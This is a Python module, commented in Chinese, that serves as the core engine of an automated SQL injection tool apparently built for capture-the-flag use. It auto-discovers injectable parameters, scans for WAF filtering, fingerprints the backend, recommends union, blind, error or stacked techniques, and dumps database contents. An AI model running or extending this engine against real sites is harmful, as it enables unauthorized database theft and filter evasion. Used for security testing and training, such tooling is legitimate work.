"""引擎总调度：analyze() 完成探测/指纹/方法推荐，solve() 完成脱库。"""
from __future__ import annotations

from typing import Optional

from .builder import PayloadBuilder
from .crawler import discover, injectable_param_names
from .detector import Detector
from .fingerprint import Fingerprinter
from .models import (AnalysisReport, InjectionPoint, TargetSpec, TechniqueInfo,
                     WafReport)
from .oracles import BaseOracle, OracleError
from .pipeline import DumpResult, ExtractionPipeline
from .session import HttpSession
from .waf import WafScanner
from ..techniques import all_techniques

RECOMMEND_ORDER = ("union", "error", "bool_blind", "time_blind", "stacked", "columnless")


class Engine:
    def __init__(self, spec: TargetSpec, log=None, session: Optional[HttpSession] = None):
        self.spec = spec
        self.session = session or HttpSession(spec, logger=log)

    # ------------------------------------------------------------------ analyze
    def analyze(self, scan_waf: bool = True) -> AnalysisReport:
        s = self.session
        if s.spec.login_url and not s.login():
            s.log("WARN", "登录失败，继续以匿名会话尝试")
        report = AnalysisReport(target=self.spec, session=self.session)

        # 入口自动发现：URL 无被测参数时，解析页面表单/带参链接逐候选试探
        if not s.spec.param and not s.spec.params and not s.spec.body_params:
            self._auto_discover(report)

        det = Detector(s)
        report.injection = det.analyze()
        if report.injection is None:
            # 仍输出 WAF 线索（引号转义/关键字拦截），帮助定位防护点
            placeholder = InjectionPoint(param=s.spec.param,
                                         base_value=s.spec.base_value,
                                         numeric=True, comment="#")
            scanner = WafScanner(s, placeholder, R_base=det.R_base)
            report.waf = scanner.scan(functions=False)
            report.notes.append("未发现注入点：可尝试更换被测参数、检查引号是否被转义"
                                "（见 WAF 报告）或改用 POST/Cookie 位置")
            return report

        waf = WafReport()
        if scan_waf:
            scanner = WafScanner(s, report.injection, R_base=det.R_base, R_err=det.R_err)
            waf = scanner.scan()
        if report.injection.form == "orinject":
            # or 双写形态下，字母关键字的「剥离」可还原 → 按「可用」参与方法判定
            for it in waf.items:
                if it.filtered and it.token.replace("_", "").isalpha() \
                        and "剥离" in it.evidence:
                    it.filtered = False
                    it.evidence += "（orinject 双写可还原，按可用处理）"
        report.waf = waf

        builder = PayloadBuilder(report.injection, waf)
        report.builder = builder
        fp = Fingerprinter(s, report.injection, R_err=det.R_err, builder=builder)
        report.fingerprint = fp.run(waf)

        # 方法推荐（select 被滤而堆叠可用时，堆叠(PREPARE 绕过)优先于报错）
        prefer_stacked = report.fingerprint.stacked and report.waf.is_filtered("select")
        rec_flag = {"union": report.fingerprint.echo_visible and not prefer_stacked,
                    "error": report.fingerprint.error_visible and not prefer_stacked,
                    "bool_blind": report.fingerprint.boolean_oracle,
                    "time_blind": report.fingerprint.time_oracle,
                    "stacked": report.fingerprint.stacked,
                    "columnless": waf.is_filtered("information_schema")}
        for t in all_techniques():
            ok, reason = t.feasible(report)
            info = TechniqueInfo(key=t.meta.key, name=t.meta.name,
                                 category=t.meta.category, feasible=ok, reason=reason,
                                 recommended=ok and rec_flag.get(t.meta.key, False))
            report.techniques.append(info)

        if s.found_flags:
            report.notes.insert(0, "🎉 响应中直接捕获到 flag: " + " / ".join(s.found_flags))
        return report

    # ------------------------------------------------------------------ discover
    def _auto_discover(self, report: AnalysisReport) -> bool:
        """入口页自动发现：解析表单/带参链接 → 逐候选逐参数试探注入点。

        命中后直接改写 spec（url/method/params/param），主流程无缝续跑。
        """
        s = self.session
        spec = s.spec
        candidates = discover(spec.url, s)
        if not candidates:
            s.log("WARN", "[发现] 页面上未找到任何表单或带参链接")
            return False

        for cand in candidates:
            for pname in injectable_param_names(cand):
                if s.stopped:
                    return False
                s.log("INFO", f"[试探] {cand.method} {cand.url} 参数 {pname!r}")
                spec.url = cand.url
                spec.method = cand.method
                if cand.method == "POST":
                    spec.params = {}
                    spec.body_params = dict(cand.fields)
                else:
                    spec.params = dict(cand.fields)
                    spec.body_params = {}
                spec.param = pname
                spec.base_value = cand.fields.get(pname) or "1"
                det = Detector(s)
                inj = det.analyze()
                if inj is not None:
                    s.log("INFO", f"[发现] ✓ 注入点确认: {cand.method} {cand.url} "
                                  f"参数 {pname!r}（闭合 {inj.closure!r}）")
                    report.notes.append(
                        f"自动发现注入点: {cand.source} → {cand.method} "
                        f"{cand.url} 参数 {pname}")
                    return True
                s.log("INFO", f"[试探] ✗ 参数 {pname!r} 无注入")
        s.log("WARN", "[发现] 所有候选参数均无注入点")
        return False

    # ------------------------------------------------------------------ solve
    def build_oracle(self, report: AnalysisReport, technique_key: str,
                     workers: int = 6) -> Optional[BaseOracle]:
        for t in all_techniques():
            if t.meta.key == technique_key:
                builder = PayloadBuilder(report.injection, report.waf)
                report.builder = builder
                oracle = t.make_oracle(report)
                if oracle is not None and hasattr(oracle, "workers"):
                    oracle.workers = workers
                return oracle
        return None

    def solve(self, report: AnalysisReport, technique_key: str,
              max_rows: int = 20, dump_all_dbs: bool = False,
              workers: int = 6) -> DumpResult:
        oracle = self.build_oracle(report, technique_key, workers=workers)
        if oracle is None:
            raise OracleError(f"无法构造 {technique_key} 通道（方法不可用）")
        builder = PayloadBuilder(report.injection, report.waf)
        pipe = ExtractionPipeline(oracle, builder, self.session, report.waf)
        return pipe.auto_dump(max_rows=max_rows, dump_all_dbs=dump_all_dbs)
